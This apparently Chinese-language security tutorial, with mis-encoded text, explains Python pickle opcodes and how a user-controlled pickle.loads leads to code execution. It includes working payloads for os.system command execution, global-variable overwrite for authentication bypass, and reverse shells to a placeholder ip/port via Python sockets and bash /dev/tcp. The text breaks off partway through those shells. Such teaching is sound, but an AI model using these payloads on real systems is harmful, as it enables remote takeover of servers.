<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># å°†å½“å‰stackåˆ—è¡¨æ·»åŠ åˆ°metastackä¸­ï¼Œç›¸å½“äºæ ‡è®°</span><br>    self.metastack.append(self.stack)<br>    <span class="hljs-comment"># æ¸…ç©ºå½“å‰æ ˆ</span><br>    self.stack = []<br>    <span class="hljs-comment"># è®¾ç½®ä¸€ä¸ªç®€åŒ–çš„appendæ–¹æ³•</span><br>    self.append = self.stack.append<br>dispatch[MARK[<span class="hljs-number">0</span>]] = load_mark<br></code></pre></td></tr></table></figure>

<p><strong>S</strong></p>
<p>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_string</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># è¯»å–ä¸€è¡Œæ•°æ®ï¼Œå»é™¤æ¢è¡Œç¬¦</span><br>    data = self.readline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># å»æ‰æœ€å¤–é¢çš„å¼•å·</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt;= <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] == data[-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;&quot;\&#x27;&#x27;</span>:<br>        data = data[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> UnpicklingError(<span class="hljs-string">&quot;the STRING opcode argument must be quoted&quot;</span>)<br>    <span class="hljs-comment"># å¯¹æ•°æ®è§£ç åæ·»åŠ åˆ°å½“å‰æ ˆä¸­</span><br>    self.append(self._decode_string(codecs.escape_decode(data)[<span class="hljs-number">0</span>]))<br>dispatch[STRING[<span class="hljs-number">0</span>]] = load_string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_decode_string</span>(<span class="hljs-params">self, value</span>):<br>    <span class="hljs-comment"># Used to allow strings from Python 2 to be decoded either as</span><br>    <span class="hljs-comment"># bytes or Unicode strings.  This should be used only with the</span><br>    <span class="hljs-comment"># STRING, BINSTRING and SHORT_BINSTRING opcodes.</span><br>    <span class="hljs-keyword">if</span> self.encoding == <span class="hljs-string">&quot;bytes&quot;</span>:<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> value.decode(self.encoding, self.errors)<br></code></pre></td></tr></table></figure>

<p><strong>t</strong></p>
<p>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_tuple</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># å¼¹å‡ºå½“å‰æ ˆä¸­æ•°æ®</span><br>    items = self.pop_mark()<br>    <span class="hljs-comment"># è½¬æˆtupleç±»å‹å¹¶æ·»åŠ åˆ°è¿˜åŸåçš„æ ˆä¸­</span><br>    self.append(<span class="hljs-built_in">tuple</span>(items))<br>dispatch[TUPLE[<span class="hljs-number">0</span>]] = load_tuple<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># è¿”å›å½“å‰çš„stackåˆ°items</span><br>    items = self.stack<br>    <span class="hljs-comment"># ä»metastackè¿˜åŸä¹‹å‰çš„stack</span><br>    self.stack = self.metastack.pop()<br>    self.append = self.stack.append<br>    <span class="hljs-keyword">return</span> items<br></code></pre></td></tr></table></figure>



<p><strong>R</strong></p>
<p>ä»æ ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆå¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å¹¶æŠŠç»“æœå‹å›æ ˆ</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_reduce</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°</span><br>    args = stack.pop()<br>    <span class="hljs-comment"># ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°</span><br>    func = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># è°ƒç”¨funcå‡½æ•°ï¼Œå¹¶æŠŠç»“æœèµ‹ç»™æ ˆé¡¶</span><br>    stack[-<span class="hljs-number">1</span>] = func(*args)<br>dispatch[REDUCE[<span class="hljs-number">0</span>]] = load_reduce<br></code></pre></td></tr></table></figure>


<p><strong>.</strong></p>
<p>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸º pickle.loads() çš„è¿”å›å€¼</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç»“æŸååºåˆ—åŒ–</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_stop</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># æ ˆé¡¶çš„å€¼ä½œä¸ºè¿”å›å€¼</span><br>    value = self.stack.pop()<br>    <span class="hljs-keyword">raise</span> _Stop(value)<br>dispatch[STOP[<span class="hljs-number">0</span>]] = load_stop<br></code></pre></td></tr></table></figure>




<p>æ‰€ä»¥å¯ä»¥å¾—åˆ°ä»¥ä¸‹è§£é‡Š</p>
<p>cåé¢è·Ÿçš„æ˜¯æ¨¡å—åï¼Œæ¢è¡Œä¹‹åçš„æ˜¯ç±»åï¼Œç›¸å½“äºå°†os.systemæ”¾å…¥æ ˆä¸­ï¼Œç„¶åæ”¾å…¥ä¸€ä¸ªæ ‡è®°ç¬¦ï¼Œæ¥ç€å°†å­—ç¬¦ä¸² whoami æ”¾å…¥æ ˆä¸­ï¼Œé‡åˆ°tå°†æ ˆä¸­çš„æ•°æ®å¼¹å‡ºï¼Œä¸€ç›´åˆ°æ ‡è®°ï¼Œå¹¶è½¬ä¸º tuple å†å­˜å…¥æ ˆä¸­ï¼ŒåŒæ—¶æ ‡è®°ç¬¦æ¶ˆå¤±ï¼Œé‡åˆ°Råå°†å…ƒç»„å–å‡ºï¼Œä½œä¸ºå‚æ•°æ”¾å…¥å‡½æ•°ä¸­æ‰§è¡Œåå°†ç»“æœè¿”å›</p>
<p>å¯ä»¥çœ‹ä½œæ‰§è¡Œäº†<code>os.system(&#39;whoami&#39;)</code></p>
<p><img src="/img/summary/python_unserialize-1.png"></p>
<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>å½“å­—èŠ‚ç å¾ˆå¤šçš„æ—¶å€™ä¸€ä¸ªä¸€ä¸ªå¯¹ç€è¡¨å»è¯»ä¼šå¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥Pythonæä¾›äº†pickletoolså·¥å…·ï¼Œä¾¿äºäººå·¥è§£è¯»opcode</p>
<p>pickletoolså¸¸ç”¨çš„æœ‰<code>pickletools.dis</code>å’Œ<code>pickletools.optimize</code></p>
<p><code>pickletools.dis</code>ï¼šå…·æœ‰åæ±‡ç¼–çš„åŠŸèƒ½ï¼Œå¯ä»¥ä»¥å¯è¯»æ€§è¾ƒå¼ºçš„æ–¹å¼å±•ç¤ºä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡</p>
<p><img src="/img/summary/python_unserialize-2.png"></p>
<p><code>pickletools.optimize</code>ï¼šå¯¹ä¸€ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œä¼˜åŒ–ï¼ˆæ¶ˆé™¤æœªä½¿ç”¨çš„ <code>PUT</code> æ“ä½œç ï¼‰</p>
<p><img src="/img/summary/python_unserialize-3.png"></p>
<h1 id="å¸¸è§åˆ©ç”¨æ€è·¯"><a href="#å¸¸è§åˆ©ç”¨æ€è·¯" class="headerlink" title="å¸¸è§åˆ©ç”¨æ€è·¯"></a>å¸¸è§åˆ©ç”¨æ€è·¯</h1><p>æ¼æ´äº§ç”ŸåŸå› æ˜¯ç”¨æˆ·å¯æ§çš„ååºåˆ—åŒ–å…¥å£ç‚¹</p>
<h2 id="é­”æœ¯æ–¹æ³•-reduce"><a href="#é­”æœ¯æ–¹æ³•-reduce" class="headerlink" title="é­”æœ¯æ–¹æ³• __reduce__()"></a>é­”æœ¯æ–¹æ³• __reduce__()</h2><blockquote>
<p>PVM çš„ æ“ä½œç  R å°±æ˜¯ __reduce__() çš„è¿”å›å€¼çš„ä¸€ä¸ªåº•å±‚å®ç°<br>ä¸phpä¸­çš„__wakeup()æ–¹æ³•ç±»ä¼¼ï¼Œpythonåœ¨ååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨__reduce__()é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹è§¦å‘æ¶æ„ä»£ç </p>
</blockquote>
<p>ä¸€ä¸ªåˆ©ç”¨<code>__reduce__()</code>çš„ä¾‹å­ï¼Œåœ¨èƒ½å¤Ÿä¼ å…¥å¯æ§çš„ pickle.loads çš„ data æ—¶å°±å¯ä»¥ç”Ÿæ•ˆ</p>
<p>ä½†æ˜¯éœ€è¦æ³¨æ„reduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># æ³¨æ„python2ä¸python3 ä¹‹é—´çš„æ–°å¼ç±»ä¸æ—§å¼ç±»çš„åŒºåˆ«ï¼Œpython2éœ€è¦æ‰‹åŠ¨ç»§æ‰¿object</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        shell = <span class="hljs-string">&quot;&quot;&quot;whoami&quot;&quot;&quot;</span>          <span class="hljs-comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>        <span class="hljs-keyword">return</span> os.system, (shell,)    <span class="hljs-comment"># reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span><br><br><br>test = Test()<br>a = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br>pickle.loads(a)<br><span class="hljs-built_in">print</span>(a)<br>pickletools.dis(pickletools.optimize(a))<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/python_unserialize-4.png"></p>
<p><img src="/img/summary/python_unserialize-5.png"></p>
<h2 id="å…¨å±€å˜é‡è¦†ç›–"><a href="#å…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="å…¨å±€å˜é‡è¦†ç›–"></a>å…¨å±€å˜é‡è¦†ç›–</h2><blockquote>
<p>å¯ä»¥é€šè¿‡è¦†ç›–ä¸€äº›å‡­è¯è¾¾åˆ°ç»•è¿‡èº«ä»½éªŒè¯çš„ç›®çš„</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br>pickletools.dis(opcode)<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/python_unserialize-6.png"></p>
<h2 id="å…¨å±€å˜é‡å¼•ç”¨"><a href="#å…¨å±€å˜é‡å¼•ç”¨" class="headerlink" title="å…¨å±€å˜é‡å¼•ç”¨"></a>å…¨å±€å˜é‡å¼•ç”¨</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(<span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVa\nsb.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No&quot;</span>)<br><br><br>test = Target()<br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä¾‹å­ä¸­æˆ‘ä»¬å¹¶ä¸çŸ¥é“<code>secret.pwd</code>çš„å€¼ï¼Œè¦ä½¿ifæˆç«‹ï¼Œå¯ä»¥ä½¿ç”¨<code>c</code>æ¥å®ç°</p>
<p><code>c</code>çš„ä½œç”¨æ˜¯ è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ– import ä¸€ä¸ªæ¨¡å—ï¼ˆä¼šè°ƒç”¨ import è¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ï¼Œå‹å…¥æ ˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVaaa\nsb.&#x27;</span><br><br><span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/python_unserialize-7.png"></p>
<blockquote>
<p>ä¸phpååºåˆ—åŒ–ä¸­çš„<code>$this-&gt;b = &amp;$this-&gt;a;</code>å¼•ç”¨ç»•è¿‡ç±»ä¼¼ï¼Œåªä¸è¿‡pythonç”¨çš„æ˜¯import</p>
</blockquote>
<h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>pickleä¸­ç”¨æ¥æ„é€ å‡½æ•°æ‰§è¡Œçš„å­—èŠ‚ç æœ‰å››ä¸ªä¸ªï¼š<code>R</code>ã€<code>i</code>ã€<code>o</code>ä»¥åŠ<code>b +__setstate__()</code></p>
<h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><p><a href="#a">ä¸Šæ–‡</a>ä¸­æåˆ°çš„ä¾‹å­ç”¨çš„å°±æ˜¯<code>R</code>æ¥å®ç°Rce</p>
<blockquote>
<p>R: ä»æ ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆå¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å¹¶æŠŠç»“æœå‹å›æ ˆ</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>




<h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><blockquote>
<p>ç›¸å½“äº c å’Œ o çš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_inst</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># å‰ä¸‰è¡Œä»£ç ä¸cçš„ä»£ç ä¸€è‡´ï¼Œç”¨æ¥è°ƒç”¨</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># é€šè¿‡pop_mark()å‡½æ•°å¾—åˆ°å‚æ•°ï¼Œåˆ©ç”¨_instantiateå‡½æ•°æ‰§è¡Œï¼Œå°†ç»“æœå­˜å…¥æ ˆä¸­</span><br>    self._instantiate(klass, self.pop_mark())<br>dispatch[INST[<span class="hljs-number">0</span>]] = load_inst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_instantiate</span>(<span class="hljs-params">self, klass, args</span>):<br>    <span class="hljs-keyword">if</span> (args <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(klass, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span><br>        <span class="hljs-built_in">hasattr</span>(klass, <span class="hljs-string">&quot;__getinitargs__&quot;</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            value = klass(*args)<br>        <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;in constructor for %s: %s&quot;</span> %<br>                            (klass.__name__, <span class="hljs-built_in">str</span>(err)), sys.exc_info()[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        value = klass.__new__(klass)<br>    self.append(value)<br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><blockquote>
<p>ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸º callableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬ n ä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_obj</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># å¼¹å‡ºæ ˆä¸­æ‰€æœ‰æ•°æ®èµ‹å€¼ç»™args</span><br>    args = self.pop_mark()<br>    <span class="hljs-comment"># åœ¨argsä¸­å¼¹å‡ºç¬¬ä¸€ä¸ªä½œä¸ºç±»å</span><br>    cls = args.pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># åˆ©ç”¨_instantiateå‡½æ•°æ‰§è¡Œå¹¶å°†ç»“æœå‹å›æ ˆä¸­</span><br>    self._instantiate(cls, args)<br>dispatch[OBJ[<span class="hljs-number">0</span>]] = load_obj<br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="b-setstate"><a href="#b-setstate" class="headerlink" title="b + __setstate__()"></a>b + __setstate__()</h3><blockquote>
<p>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®ï¼Œè°ƒç”¨ __setstate__ æˆ– __dict__.update()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># è·å–æ ˆé¡¶å…ƒç´ </span><br>    state = stack.pop()<br>    <span class="hljs-comment"># è·å–æ ˆä¸­å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ </span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># è·å–å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ çš„__setstate__å±æ€§</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-comment"># setstate ä¸ä¸ºNoneåˆ™è°ƒç”¨instå¯¹è±¡çš„__setstateï¼Œå°†stateä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒ</span><br>    <span class="hljs-comment"># ä¸€èˆ¬ä¸å­˜åœ¨__setstate__æ–¹æ³•ï¼Œsetstate(state)ä¼šé€ æˆä»»æ„å‡½æ•°è°ƒç”¨</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># å¦‚æœstateæ˜¯å…ƒç»„ç±»å‹ä¸”é•¿åº¦ä¸º2ï¼Œåˆ™å°†å…¶åˆ†è§£æˆstate, slotstate</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-comment"># éå†stateå­—å…¸ï¼Œå°†é”®åèµ‹å€¼ç»™inst_dictï¼Œé”®å€¼ç›´æ¥èµ‹å€¼</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-comment"># éå†slotstateå­—å…¸ï¼Œå¹¶å°†å…¶é”®å€¼å¯¹èµ‹å€¼ç»™instå¯¹è±¡</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºä¸€èˆ¬ä¸å­˜åœ¨__setstate__ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘setstate(state)ã€‚ä½†æ˜¯å¦‚æœæ‰‹åŠ¨å‹å…¥ä¸€ä¸ªå­—å…¸<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>ï¼Œæ‰§è¡Œ<code>b</code>ã€‚å°±ä¼šæ·»åŠ ä¸€ä¸ªæ–°çš„é”®å€¼å¯¹ï¼Œå†ç»§ç»­å‹å…¥å‘½ä»¤ï¼Œå†æ‰§è¡Œ<code>b</code>æ—¶ï¼Œ<code>setstate</code>å°±ä¸ä¼šä¸ºNoneäº†ï¼Œè€Œæ˜¯æˆ‘ä»¬ä¼ å…¥çš„os.systemï¼Œå°±æ˜¯<code>os.system(state)</code>ï¼Œè€Œstateå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ï¼Œä»è€Œå®Œæˆrce</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = <span class="hljs-string">&quot;aa&quot;</span><br><br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Test</span><br><span class="hljs-string">)o(S&quot;__setstate__&quot;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">dbS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br>pickletools.dis(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">    0: (    MARK</span><br><span class="hljs-string">    1: c        GLOBAL     &#x27;__main__ Test&#x27;</span><br><span class="hljs-string">   16: )        EMPTY_TUPLE</span><br><span class="hljs-string">   17: o        OBJ        (MARK at 0)</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: S        STRING     &#x27;__setstate__&#x27;</span><br><span class="hljs-string">   35: c        GLOBAL     &#x27;os system&#x27;</span><br><span class="hljs-string">   46: d        DICT       (MARK at 18)</span><br><span class="hljs-string">   47: b    BUILD</span><br><span class="hljs-string">   48: S    STRING     &#x27;whoami&#x27;</span><br><span class="hljs-string">   58: b    BUILD</span><br><span class="hljs-string">   59: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>æ—¢ç„¶å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œé‚£ä¹ˆè‚¯å®šå¯ä»¥åå¼¹shelläº†ï¼Œä»¥ä¸‹æ˜¯å‡ ç§payload</p>
<p><strong>åˆ©ç”¨iæ‰§è¡Œå‘½ä»¤å»ºç«‹shell</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;, port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br>payload2 = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">popen</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span 